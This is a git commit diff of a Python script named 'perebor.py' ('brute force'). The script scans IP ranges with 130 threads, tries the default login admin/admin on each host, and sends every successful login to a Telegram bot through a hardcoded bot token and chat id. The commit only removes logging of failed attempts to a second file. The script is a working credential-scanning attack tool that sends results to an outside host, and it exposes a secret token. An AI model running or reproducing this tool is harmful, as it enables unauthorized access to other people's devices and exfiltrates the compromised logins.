10611baabdeba61cec0f75143719568f99b7aa3f
Albatrossee <56092033+Albatrossee@users.noreply.github.com>
2023-12-05 11:29:09 +0300

    perebor.py

--- perebor.py
+++ perebor.py
@@ -7,7 +7,7 @@ TOKEN = '6741660479:AAH91nQ2kIXbsva6NQEMpRNldhfS7vPP8Wc'
 chat_id = "1365132609"
 
 def check_login(args):
-    ip_range, username, password, success_file, output_file = args
+    ip_range, username, password, success_file = args
     ip_start, ip_end = map(str.strip, ip_range.split('-'))
     ip_range_list = [f"{ip_start[:ip_start.rindex('.')]}.{i}" for i in range(int(ip_start[ip_start.rindex('.')+1:]), int(ip_end[ip_end.rindex('.')+1:])+1)]
 
@@ -29,46 +29,33 @@ def check_login(args):
                 print(success_message)
                 url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={success_message}"
                 print(requests.get(url).json())
-                with open(output_file, 'a', encoding='utf-8') as f_output:
-                    f_output.write(success_message)
                 with open(success_file, 'a', encoding='utf-8') as f_success:
                     f_success.write(success_message)
-            else:
-                print(error_message)
-                with open(output_file, 'a', encoding='utf-8') as f_output:
-                    f_output.write(error_message)
 
         except requests.exceptions.SSLError as e:
             error_message = f"IP {ip}: Ошибка SSL - {e}\n"
             print(error_message)
-            with open(output_file, 'a', encoding='utf-8') as f_output:
-                f_output.write(error_message)
         except ConnectTimeoutError as e:
             error_message = f"IP {ip}: Время ожидания подключения истекло - {e}\n"
             print(error_message)
-            with open(output_file, 'a', encoding='utf-8') as f_output:
-                f_output.write(error_message)
         except requests.RequestException as e:
             error_message = f"IP {ip}: Ошибка запроса - {e}\n"
             print(error_message)
-            with open(output_file, 'a', encoding='utf-8') as f_output:
-                f_output.write(error_message)
 
-def process_ranges(ip_ranges_file, username, password, success_file, output_file):
+def process_ranges(ip_ranges_file, username, password, success_file):
     with open(ip_ranges_file, 'r', encoding='utf-8') as f:
         ip_ranges = [line.strip() for line in f]
 
     with ThreadPoolExecutor(max_workers=130) as executor:
-        args = ((ip_range, username, password, success_file, output_file) for ip_range in ip_ranges)
+        args = ((ip_range, username, password, success_file) for ip_range in ip_ranges)
         executor.map(check_login, args)
 
 def main():
     success_file = "successful_logins.txt"
-    output_file = "all_results.txt"
     username = "admin"
     password = "admin"
     ip_ranges_file = "sorted.txt"  # Замените на имя вашего файла с диапазонами IP
-    process_ranges(ip_ranges_file, username, password, success_file, output_file) # перебор диапазонов
+    process_ranges(ip_ranges_file, username, password, success_file)  # перебор диапазонов
 
 if __name__ == "__main__":
     main()
